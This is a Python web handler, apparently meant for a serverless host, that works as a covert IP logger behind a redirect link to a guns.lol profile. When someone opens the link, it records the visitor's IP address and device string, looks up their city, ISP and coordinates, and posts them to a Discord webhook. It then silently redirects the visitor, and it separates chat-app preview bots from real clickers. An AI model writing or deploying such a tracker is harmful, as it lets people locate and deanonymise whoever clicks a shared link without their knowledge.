from http.server import BaseHTTPRequestHandler
import requests
import json

# 1. PASTE YOUR WEBHOOK LINK BELOW
WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL_HERE"
REDIRECT_URL = "https://guns.lol/sleezyyyyyy"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ua = self.headers.get('User-Agent', '')
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        
        # Detect if it's just Discord/Telegram showing a preview
        is_bot = any(bot in ua for bot in ["Discordbot", "TelegramBot", "Twitterbot"])
        
        # Get geo data (Coordinates, ISP, etc.)
        try:
            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
            city = geo.get('city', 'Unknown')
            country = geo.get('country', 'Unknown')
            isp = geo.get('isp', 'Unknown')
            coords = f"{geo.get('lat', '0')}, {geo.get('lon', '0')}"
        except:
            city = country = isp = coords = "Error fetching data"

        # Determine which alert to send
        title = "📤 Link Sent / Previewed" if is_bot else "🎯 New Visitor Logged!"
        color = 3447003 if is_bot else 16711680

        # Build the detailed embed
        payload = {
            "embeds": [{
                "title": title,
                "color": color,
                "fields": [
                    {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
                    {"name": "📍 Location", "value": f"{city}, {country}", "inline": True},
                    {"name": "🏢 ISP/Provider", "value": isp, "inline": False},
                    {"name": "🗺️ Coordinates", "value": coords, "inline": False},
                    {"name": "📱 Device Info", "value": f"```{ua[:200]}```", "inline": False}
                ],
                "footer": {"text": "Guns.lol Redirect Logger"}
            }]
        }

        # Send to Discord
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except:
            pass # Prevent site crash if Discord is down

        # Always redirect the user
        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()
